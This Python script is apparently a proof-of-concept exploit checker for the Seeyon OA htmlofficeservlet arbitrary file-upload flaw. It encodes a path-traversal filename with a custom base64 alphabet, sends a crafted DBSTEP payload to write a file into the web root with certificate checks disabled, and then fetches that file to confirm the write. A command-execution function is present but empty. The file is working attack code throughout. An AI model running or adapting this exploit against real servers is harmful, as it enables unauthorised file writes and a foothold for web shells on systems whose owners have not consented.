# -*- coding: utf-8 -*-
#author: cwbird
import time
import string
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def encode(origin_bytes):
    """
    重构 base64 编码函数
    """
    # 将每一位bytes转换为二进制字符串
    base64_charset = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
    base64_bytes = ['{:0>8}'.format(bin(ord(b)).replace('0b', '')) for b in origin_bytes]

    resp = ''
    nums = len(base64_bytes) // 3
    remain = len(base64_bytes) % 3

    integral_part = base64_bytes[0:3 * nums]
    while integral_part:
        # 取三个字节，以每6比特，转换为4个整数
        tmp_unit = ''.join(integral_part[0:3])
        tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]
        # 取对应base64字符
        resp += ''.join([base64_charset[i] for i in tmp_unit])
        integral_part = integral_part[3:]

    if remain:
        # 补齐三个字节，每个字节补充 0000 0000
        remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8
        # 取三个字节，以每6比特，转换为4个整数
        # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=
        tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]
        resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='

    return resp

def exp_check(arg):
    tmp_random_str = '7969676569776f6c696769616f'
    headers = {
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
        "Content-Length": "429",
    }
    file_name = encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\shXi3GAEuT.txt')
    payload = "DBSTEP V3.0     355             0               10             DBSTEP=OKMLlKlV\r\n"
    payload += "OPTION=S3WYOSWLBSGr\r\n"
    payload += "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n"
    payload += "CREATEDATE=wUghPB3szB3Xwg66\r\n"
    payload += "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n"
    payload += "originalFileId=wV66\r\n"
    payload += "originalCreateDate=wUghPB3szB3Xwg66\r\n"
    payload += "FILENAME={}\r\n".format(file_name)
    payload += "needReadFile=yRWZdAS6\r\n"
    payload += "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n"
    payload += "a{}".format(tmp_random_str)

    try:
        requests.post(url=arg+"/seeyon/htmlofficeservlet", data=payload,timeout=5, headers=headers,verify= False)

        
        upfile_url = arg+"/seeyon/shXi3GAEuT.txt"
        time.sleep(2)
        resp = requests.get(url=upfile_url,timeout=5,verify= False)
        code = resp.status_code
        content = resp.text
        if code==200 and '7969676569776f6c696769616f' in content:
            return 1
        else:
            return 2
    except:
        return 3

def exp_cmd(url,cmd):
    pass
